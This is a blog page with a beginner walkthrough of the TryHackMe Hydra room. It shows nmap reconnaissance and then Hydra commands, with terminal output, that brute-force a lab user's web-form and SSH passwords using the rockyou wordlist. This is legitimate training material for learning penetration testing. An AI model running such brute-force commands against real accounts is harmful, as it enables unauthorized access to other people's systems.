<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>THM - Hydra - Walkthrough | Ee-Vah?</title><meta name=keywords content="thm,walkthrough,comptia-pentest-plus-path,penetration-testing-tools-module,nessus-room,beginner-level,room,hydra,password bruteforcing,http-post-form bruteforcing,ssh bruteforcing"><meta name=description content="This series of walkthroughs aims to help out complete beginners with finishing the CompTIA Pentest+ on the TryHackMe (thm)1 website.
It is based on the learning content provided in the Hydra room.
Task 1 - Hydra Introduction Check out the introduction to hydra and all the different protocols it supports before moving on.
Question 1: Read the above and have Hydra at the ready.
No answer needed
Task 2 - Using Hydra Make sure you deployed the machine in the room before trying solve the questions."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="THM - Hydra - Walkthrough"><meta property="og:description" content="This series of walkthroughs aims to help out complete beginners with finishing the CompTIA Pentest+ on the TryHackMe (thm)1 website.
It is based on the learning content provided in the Hydra room.
Task 1 - Hydra Introduction Check out the introduction to hydra and all the different protocols it supports before moving on.
Question 1: Read the above and have Hydra at the ready.
No answer needed
Task 2 - Using Hydra Make sure you deployed the machine in the room before trying solve the questions."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-10-13T02:00:00+00:00"><meta property="article:modified_time" content="2022-10-13T02:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="THM - Hydra - Walkthrough"><meta name=twitter:description content="This series of walkthroughs aims to help out complete beginners with finishing the CompTIA Pentest+ on the TryHackMe (thm)1 website.
It is based on the learning content provided in the Hydra room.
Task 1 - Hydra Introduction Check out the introduction to hydra and all the different protocols it supports before moving on.
Question 1: Read the above and have Hydra at the ready.
No answer needed
Task 2 - Using Hydra Make sure you deployed the machine in the room before trying solve the questions."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"THM - Hydra - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"THM - Hydra - Walkthrough","name":"THM - Hydra - Walkthrough","description":"This series of walkthroughs aims to help out complete beginners with finishing the CompTIA Pentest+ on the TryHackMe (thm)1 website.\nIt is based on the learning content provided in the Hydra room.\nTask 1 - Hydra Introduction Check out the introduction to hydra and all the different protocols it supports before moving on.\nQuestion 1: Read the above and have Hydra at the ready.\nNo answer needed\nTask 2 - Using Hydra Make sure you deployed the machine in the room before trying solve the questions.","keywords":["thm","walkthrough","comptia-pentest-plus-path","penetration-testing-tools-module","nessus-room","beginner-level","room","hydra","password bruteforcing","http-post-form bruteforcing","ssh bruteforcing"],"articleBody":"This series of walkthroughs aims to help out complete beginners with finishing the CompTIA Pentest+ on the TryHackMe (thm)1 website.\nIt is based on the learning content provided in the Hydra room.\nTask 1 - Hydra Introduction Check out the introduction to hydra and all the different protocols it supports before moving on.\nQuestion 1: Read the above and have Hydra at the ready.\nNo answer needed\nTask 2 - Using Hydra Make sure you deployed the machine in the room before trying solve the questions.\nLet’s take a closer look at the commands discussed in the room.\nhydra -l -P 10.10.10.247 -t 4 ssh and\nhydra -l -P 10.10.10.247 http-post-form \"/:username=^USER^\u0026password=^PASS^:F=incorrect\" -V Let’s break them down:\ncommand name description hydra a very fast network logon cracker which supports many different services options description -l / -L or -L FILE login with LOGIN name, or load several logins from FILE -p / -P or -P FILE try password PASS, or load several passwords from FILE -v / -V verbose mode / show login+pass combination for each attempt -t run TASKS number of connects in parallel (default: 16) 10.10.10.247 : a target to attack, can be an IPv4 address, IPv6 address or DNS name. ssh : a service to attack, see the list of protocols available http-post-form : a service to attack, see the list of protocols available “/:username=^USER^\u0026password=^PASS^:F=incorrect” optional service parameters To check out the optional service parameters for any , here the http-post-form module, run\nhydra -U http-post-form in your terminal.\nHere is the shortened terminal interaction:\nroot@ip-10-10-184-104:~# hydra -U http-post-form ... Help for module http-post-form: ============================================================================ Module http-post-form requires the page and the parameters for the web form. ... By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables The parameters take three \":\" separated values, plus optional values. (Note: if you need a colon in the option string as value, escape it with \"\\:\", but do not escape a \"\\\" with \"\\\\\".) Syntax: ::[:[:] ... Great, theory down, practice to go. So let’s move on to the questions.\nQuestion 1: Use Hydra to bruteforce molly’s web password. What is flag 1?\nflag\nTo get it, first, let’s check our connection to the target:\nping -c 3 10.10.192.119 Which port is the web server running on?(Never assume it’s port 80.) Check the open ports.\nnmap 10.10.192.119 Complete terminal interaction:\nroot@ip-10-10-184-104:~# ping -c 3 10.10.192.119 PING 10.10.192.119 (10.10.192.119) 56(84) bytes of data. 64 bytes from 10.10.192.119: icmp_seq=1 ttl=64 time=0.936 ms 64 bytes from 10.10.192.119: icmp_seq=2 ttl=64 time=0.379 ms 64 bytes from 10.10.192.119: icmp_seq=3 ttl=64 time=0.515 ms --- 10.10.192.119 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2035ms rtt min/avg/max/mdev = 0.379/0.610/0.936/0.237 ms root@ip-10-10-184-104:~# nmap 10.10.192.119 Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-16 23:31 BST Nmap scan report for ip-10-10-192-119.eu-west-1.compute.internal (10.10.192.119) Host is up (0.0013s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 02:19:86:9D:BF:47 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds As we can see, the target is up and running, and we have a connection to it. As for the web server, it is running on port 80 as usual, but it never hurts to double check.\nLet’s check it out in the browser.\nLooks good, check out the page’s source code. Nothing interesting here, but again, it never hurts to check.\nLet’s try to log in with some dummy data (Username = username; Password = password), but before pressing enter, open up developer tools (CTRL+SHIFT+I in firefox) to view our request. Head over to the network tab, and inspect our Request Headers.\nAs we see, for logging in, the HTTP Request Method is POST, while the site we are trying to log on is found on http://10.10.192.119/login. Also, our log in dummy credentials were sent as a request payload in this form:“username=username\u0026password=password”.\nEvery piece is already in our hand, so let’s get molly’s password.\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.119 http-post-form \"/login:username=^USER^\u0026password=^PASS^:F=incorrect\" This is the complete terminal interaction:\nroot@ip-10-10-184-104:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.119 http-post-form \"/login:username=^USER^\u0026password=^PASS^:F=incorrect\" Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (http://www.thc.org/thc-hydra) starting at 2022-10-17 00:00:04 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task [DATA] attacking http-post-form://10.10.192.119:80//login:username=^USER^\u0026password=^PASS^:F=incorrect [80][http-post-form] host: 10.10.192.119 login: molly password: *password* 1 of 1 target successfully completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) finished at 2022-10-17 00:00:13 root@ip-10-10-184-104:~# We successfully bruteforced molly’s password. Let’s log in:\nNice, we found the first flag. And what a nice picture.\nQuestion 2: Use Hydra to bruteforce molly’s SSH password. What is flag 2?\nflag\nTo get the second flag, let’s try the same, this time for ssh.\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.119 ssh -v This is the complete terminal interaction:\nroot@ip-10-10-184-104:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.119 ssh -v Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (http://www.thc.org/thc-hydra) starting at 2022-10-17 00:10:36 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task [DATA] attacking ssh://10.10.192.119:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://molly@10.10.192.119:22 [INFO] Successful, password authentication is supported by ssh://10.10.192.119:22 [ERROR] could not connect to target port 22: Socket error: Connection reset by peer [ERROR] ssh protocol error [ERROR] could not connect to target port 22: Socket error: Connection reset by peer [ERROR] ssh protocol error [22][ssh] host: 10.10.192.119 login: molly password: *password* [STATUS] attack finished for 10.10.192.119 (waiting for children to complete tests) 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 3 final worker threads did not complete until end. [ERROR] 3 targets did not resolve or could not be connected [ERROR] 16 targets did not complete Hydra (http://www.thc.org/thc-hydra) finished at 2022-10-17 00:10:41 Log in with ssh,\nssh molly@10.10.192.119 and then check the working directory for the flag.\nls -hlag Finally, get the second flag:\ncat flag2.txt Complete terminal interaction:\nroot@ip-10-10-184-104:~# ssh molly@10.10.192.119 The authenticity of host '10.10.192.119 (10.10.192.119)' can't be established. ECDSA key fingerprint is SHA256:tiGAbqtH/9FwerHyuDUNFGixYidKldG5s3yHhXTBhLU. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '10.10.192.119' (ECDSA) to the list of known hosts. molly@10.10.192.119's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 65 packages can be updated. 32 updates are security updates. Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98 molly@ip-10-10-192-119:~$ ls -alg total 36 drwxr-xr-x 3 molly 4096 Dec 17 2019 . drwxr-xr-x 4 root 4096 Dec 17 2019 .. -rw------- 1 molly 42 Dec 17 2019 .bash_history -rw-r--r-- 1 molly 220 Dec 17 2019 .bash_logout -rw-r--r-- 1 molly 3771 Dec 17 2019 .bashrc drwx------ 2 molly 4096 Dec 17 2019 .cache -rw-rw-r-- 1 molly 38 Dec 17 2019 flag2.txt -rw-r--r-- 1 molly 655 Dec 17 2019 .profile -rw------- 1 molly 604 Dec 17 2019 .viminfo molly@ip-10-10-192-119:~$ cat flag2.txt THM{*flag*} molly@ip-10-10-192-119:~$ With this, we got both of the flags, and we successfully arrived at the end of this room. Make sure, that you terminated the target machine you worked on, before proceeding to the next room.\nthm - shorthand for TryHackMe from now on ↩︎\n","wordCount":"1273","inLanguage":"en","datePublished":"2022-10-13T02:00:00Z","dateModified":"2022-10-13T02:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>THM - Hydra - Walkthrough</h1><div class=post-meta><span title='2022-10-13 02:00:00 +0000 +0000'>October, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1273 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#task-1---hydra-introduction><strong>Task 1 - Hydra Introduction</strong></a></li><li><a href=#task-2---using-hydra><strong>Task 2 - Using Hydra</strong></a></li></ul></nav></div></details></div><div class=post-content><p>This series of walkthroughs aims to help out complete beginners with finishing the <strong>CompTIA Pentest+</strong> on the <a href=https://tryhackme.com/ title="TryHackMe website">TryHackMe</a> (<em><strong>thm</strong></em>)<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup> website.</p><p>It is based on the <em><strong>learning content</strong></em> provided in the <a href=https://tryhackme.com/room/hydra title=Hydra>Hydra</a> room.</p><h2 id=task-1---hydra-introduction><strong>Task 1 - Hydra Introduction</strong><a hidden class=anchor aria-hidden=true href=#task-1---hydra-introduction>#</a></h2><p>Check out the introduction to <em><strong>hydra</strong></em> and all the different <strong>protocols</strong> it supports before moving on.</p><p><strong>Question 1</strong>: <em>Read the above and have Hydra at the ready.</em></p><blockquote><p>No answer needed</p></blockquote><h2 id=task-2---using-hydra><strong>Task 2 - Using Hydra</strong><a hidden class=anchor aria-hidden=true href=#task-2---using-hydra>#</a></h2><p>Make sure you <strong>deployed</strong> the machine in the room before trying solve the <strong>questions</strong>.</p><p>Let&rsquo;s take a closer look at the <strong>commands</strong> discussed in the room.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -l &lt;username&gt; -P &lt;full path to pass&gt; 10.10.10.247 -t <span class=m>4</span> ssh
</span></span></code></pre></div><p>and</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -l &lt;username&gt; -P &lt;wordlist&gt; 10.10.10.247 http-post-form <span class=s2>&#34;/:username=^USER^&amp;password=^PASS^:F=incorrect&#34;</span> -V
</span></span></code></pre></div><p>Let&rsquo;s <strong>break</strong> them <strong>down</strong>:</p><table><thead><tr><th style=text-align:left>command name</th><th style=text-align:left>description</th></tr></thead><tbody><tr><td style=text-align:left>hydra</td><td style=text-align:left>a very fast network logon cracker which supports many different services</td></tr></tbody></table><table><thead><tr><th style=text-align:left>options</th><th style=text-align:left>description</th></tr></thead><tbody><tr><td style=text-align:left>-l / -L</td><td style=text-align:left>or -L FILE login with LOGIN name, or load several logins from FILE</td></tr><tr><td style=text-align:left>-p / -P</td><td style=text-align:left>or -P FILE try password PASS, or load several passwords from FILE</td></tr><tr><td style=text-align:left>-v / -V</td><td style=text-align:left>verbose mode / show login+pass combination for each attempt</td></tr><tr><td style=text-align:left>-t</td><td style=text-align:left>run TASKS number of connects in parallel (default: 16)</td></tr><tr><td style=text-align:left>10.10.10.247 : &lt;target></td><td style=text-align:left>a target to attack, can be an IPv4 address, IPv6 address or DNS name.</td></tr><tr><td style=text-align:left>ssh : &lt;service></td><td style=text-align:left>a service to attack, see the list of protocols available</td></tr><tr><td style=text-align:left>http-post-form : &lt;service></td><td style=text-align:left>a service to attack, see the list of protocols available</td></tr><tr><td style=text-align:left>&ldquo;/:username=^USER^&amp;password=^PASS^:F=incorrect&rdquo;</td><td style=text-align:left>optional service parameters</td></tr></tbody></table><p>To check out the <strong>optional service parameters</strong> for any &lt;service>, here the <em><strong>http-post-form</strong></em> module, <strong>run</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -U http-post-form
</span></span></code></pre></div><p>in your <strong>terminal</strong>.</p><p>Here is the shortened <strong>terminal interaction:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@ip-10-10-184-104:~# hydra -U http-post-form
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Help <span class=k>for</span> module http-post-form:
</span></span><span class=line><span class=cl><span class=o>============================================================================</span>
</span></span><span class=line><span class=cl>Module http-post-form requires the page and the parameters <span class=k>for</span> the web form.
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>By default this module is configured to follow a maximum of <span class=m>5</span> redirections in
</span></span><span class=line><span class=cl>a row. It always gathers a new cookie from the same URL without variables
</span></span><span class=line><span class=cl>The parameters take three <span class=s2>&#34;:&#34;</span> separated values, plus optional values.
</span></span><span class=line><span class=cl><span class=o>(</span>Note: <span class=k>if</span> you need a colon in the option string as value, escape it with <span class=s2>&#34;\:&#34;</span>, but <span class=k>do</span> not escape a <span class=s2>&#34;\&#34; with &#34;</span><span class=se>\\</span><span class=s2>&#34;.)
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
</span></span></span><span class=line><span class=cl><span class=s2>...
</span></span></span></code></pre></div><p>Great, <strong>theory down, practice to go.</strong> So let&rsquo;s move on to the <strong>questions</strong>.</p><p><strong>Question 1</strong>: <em>Use Hydra to bruteforce molly&rsquo;s web password. What is flag 1?</em></p><blockquote><p>flag</p></blockquote><p><strong>To get it</strong>, first, let&rsquo;s check our <strong>connection</strong> to the <strong>target</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ping -c <span class=m>3</span> 10.10.192.119
</span></span></code></pre></div><p><strong>Which port</strong> is the <strong>web server</strong> running on?(Never assume it&rsquo;s port 80.) Check the <strong>open ports</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap 10.10.192.119
</span></span></code></pre></div><p><strong>Complete terminal interaction:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@ip-10-10-184-104:~# ping -c <span class=m>3</span> 10.10.192.119
</span></span><span class=line><span class=cl>PING 10.10.192.119 <span class=o>(</span>10.10.192.119<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.192.119: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>time</span><span class=o>=</span>0.936 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.192.119: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>time</span><span class=o>=</span>0.379 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.192.119: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>64</span> <span class=nv>time</span><span class=o>=</span>0.515 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.192.119 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>3</span> packets transmitted, <span class=m>3</span> received, 0% packet loss, <span class=nb>time</span> 2035ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 0.379/0.610/0.936/0.237 ms
</span></span><span class=line><span class=cl>root@ip-10-10-184-104:~# nmap 10.10.192.119
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.60 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-10-16 23:31 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> ip-10-10-192-119.eu-west-1.compute.internal <span class=o>(</span>10.10.192.119<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp open  ssh
</span></span><span class=line><span class=cl>80/tcp open  http
</span></span><span class=line><span class=cl>MAC Address: 02:19:86:9D:BF:47 <span class=o>(</span>Unknown<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 1.75 seconds
</span></span></code></pre></div><p>As we can see, the <strong>target</strong> is up and running, and we have a <strong>connection</strong> to it. As for the <strong>web server</strong>, it is running on port 80 as usual, but it never hurts to <strong>double check</strong>.</p><p>Let&rsquo;s check it out in the <strong>browser</strong>.</p><p><img loading=lazy src=/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/img/hydra_1.png alt=website title=Website></p><p>Looks good, check out the page&rsquo;s <strong>source code</strong>. Nothing interesting here, but again, it never hurts to check.</p><p><img loading=lazy src=/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/img/hydra_2.png alt="website - source code" title="Website's source code"></p><p>Let&rsquo;s <strong>try to log in</strong> with some dummy data (Username = username; Password = password), but before pressing enter, open up <strong>developer tools</strong> (CTRL+SHIFT+I in firefox) to <strong>view</strong> our <strong>request</strong>. Head over to the <strong>network</strong> tab, and inspect our <strong>Request Headers</strong>.</p><p><img loading=lazy src=/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/img/hydra_3.png alt="Developer tools - 1" title="Firefox developer tools"></p><p><img loading=lazy src=/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/img/hydra_4.png alt="Developer tools - 2" title="Firefox developer tools"></p><p>As we see, for <strong>logging in</strong>, the <strong>HTTP Request Method</strong> is <strong>POST</strong>, while the site we are trying to log on is found on <em>http://10.10.192.119/login</em>. Also, our log in <strong>dummy credentials</strong> were sent as a <strong>request payload</strong> in this form:&ldquo;username=username&amp;password=password&rdquo;.</p><p>Every piece is <strong>already</strong> in our hand, so let&rsquo;s <strong>get <em>molly&rsquo;s</em> password</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.119 http-post-form <span class=s2>&#34;/login:username=^USER^&amp;password=^PASS^:F=incorrect&#34;</span>
</span></span></code></pre></div><p>This is the <strong>complete terminal interaction:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@ip-10-10-184-104:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.119 http-post-form <span class=s2>&#34;/login:username=^USER^&amp;password=^PASS^:F=incorrect&#34;</span>
</span></span><span class=line><span class=cl>Hydra v8.6 <span class=o>(</span>c<span class=o>)</span> <span class=m>2017</span> by van Hauser/THC - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>http://www.thc.org/thc-hydra<span class=o>)</span> starting at 2022-10-17 00:00:04
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>16</span> tasks per <span class=m>1</span> server, overall <span class=m>16</span> tasks, <span class=m>14344398</span> login tries <span class=o>(</span>l:1/p:14344398<span class=o>)</span>, ~896525 tries per task
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking http-post-form://10.10.192.119:80//login:username<span class=o>=</span>^USER^<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span>^PASS^:F<span class=o>=</span>incorrect
</span></span><span class=line><span class=cl><span class=o>[</span>80<span class=o>][</span>http-post-form<span class=o>]</span> host: 10.10.192.119   login: molly   password: *password*
</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>http://www.thc.org/thc-hydra<span class=o>)</span> finished at 2022-10-17 00:00:13
</span></span><span class=line><span class=cl>root@ip-10-10-184-104:~# 
</span></span></code></pre></div><p>We successfully <strong>bruteforced</strong> molly&rsquo;s <strong>password</strong>. Let&rsquo;s log in:</p><p><img loading=lazy src=/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/img/hydra_5.png alt="website - source code" title="Website's source code"></p><p>Nice, we found the <strong>first flag</strong>. And what a <strong>nice</strong> picture.</p><p><img loading=lazy src=/walkthroughs/thm/comptia-pentest-plus-path/penetration-testing-tools-module/hydra-room/img/hydra_6.png alt="website - source code" title="Website's source code"></p><hr><p><strong>Question 2</strong>: <em>Use Hydra to bruteforce molly&rsquo;s SSH password. What is flag 2?</em></p><blockquote><p>flag</p></blockquote><p>To get the <strong>second flag</strong>, let&rsquo;s try the same, this time for <strong>ssh</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.119 ssh -v
</span></span></code></pre></div><p>This is the <strong>complete terminal interaction:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@ip-10-10-184-104:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.192.119 ssh -v
</span></span><span class=line><span class=cl>Hydra v8.6 <span class=o>(</span>c<span class=o>)</span> <span class=m>2017</span> by van Hauser/THC - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>http://www.thc.org/thc-hydra<span class=o>)</span> starting at 2022-10-17 00:10:36
</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class=m>4</span>
